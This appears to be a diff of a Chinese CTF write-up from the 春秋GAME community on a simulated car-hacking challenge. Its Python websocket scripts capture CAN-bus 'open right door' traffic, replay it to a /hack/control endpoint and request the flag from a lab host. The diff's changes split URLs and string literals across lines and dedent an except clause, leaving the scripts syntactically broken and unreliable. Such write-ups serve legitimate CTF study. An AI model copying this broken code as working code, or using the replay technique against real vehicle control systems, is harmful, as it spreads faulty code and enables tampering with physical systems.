@@ -38,11 +38,13 @@ https://iotsec-zone.com/
 
 欢迎找到春秋GAME投稿哦～
 
-联系vx:cium0309
+联系vx:
+cium0309
 
 欢迎加入 春秋GAME CTF交流2群
 
-Q群:703460426
+Q群:
+703460426
 
 
 ```
@@ -50,39 +52,15 @@ Q群:703460426
 2.控制单元对所传输的信息进行实时检测，具有错误诊断能力和自动恢复能力，节省生产维护成本;
 3.CAN总线符合国际标准，因此可应用不同型号控制单元间的数据传输;
 4.数据共享减少了数据的重复处理，节省成本。如对于具有CAN总线接口的电喷发动机，其它电器可共享其提供的转速、水温、机油压力温度等，可省去额外的水温、油压、油温传感器。
-```
-
-
-
-```
 1.探索页面提供http方式触发操作，并且返回流量
 2.逃跑页面提供个websocket方式触发操作
-```
-
-
-
-```
 触发动作 -- > 获取流量 –-> 提交流量
-```
-
-
-
-```
-ws = websocket.WebSocketApp("ws://ip:port/test/log",
+ws = websocket.WebSocketApp("ws://ip:
+port/test/log",
               on_message=on_message,
               )
 ws.run_forever()
-```
-
-
-
-```
 在我们调用开右车门接口后，在CAN流量中可看到发出开右车门的请求流量，所以我们需多次调用开右车的接口，在后续流量中一直重复出现的那个，即为开右车门的请求流量。
-```
-
-
-
-```
 import websocket
 import eventlet
 import requests
@@ -97,7 +75,8 @@ max_counts = 20
 do_it = False
 
 max_round = 5
-url="192.168.244.133:7410"
+url="192.168.244.133:
+7410"
 
 def on_message(ws, message):
     global max_counts
@@ -127,11 +106,6 @@ ws = websocket.WebSocketApp(f"ws://{url}/test/log",
                             on_message=on_message,
                             )
 ws.run_forever()
-```
-
-
-
-```
 import websocket
 import time
 
@@ -191,7 +165,8 @@ def payload():
 
     payload_list.reverse()
 
-url = "192.168.244.133:7410"
+url = "192.168.244.133:
+7410"
 ws = websocket.WebSocketApp(f"ws://{url}/hack/control",
                             on_message=on_message,
                             on_error=on_error,
@@ -199,11 +174,6 @@ ws = websocket.WebSocketApp(f"ws://{url}/hack/control",
 if __name__ == '__main__':
     payload()
     ws.run_forever()
-```
-
-
-
-```
 import urllib.error
 import urllib.request
 from urllib.parse import quote
@@ -220,7 +190,8 @@ Content-Length: 39  
 {"get_flag_is_a_beautiful_thing":"yes"}
 
 """
-url = "192.168.244.133:7410"#sys.argv[1]
+url = "192.168.244.133:
+7410"#sys.argv[1]
 
 if __name__ == '__main__':
     try:
@@ -231,7 +202,8 @@ if __name__ == '__main__':
             print(rep.text)
         with requests.get(f"http://{url}/fetch/api?action=flag") as rep:
             print(rep.text)
-    except urllib.error.URLError as e:
+    
+except urllib.error.URLError as e:
         print(e)
 ```
 
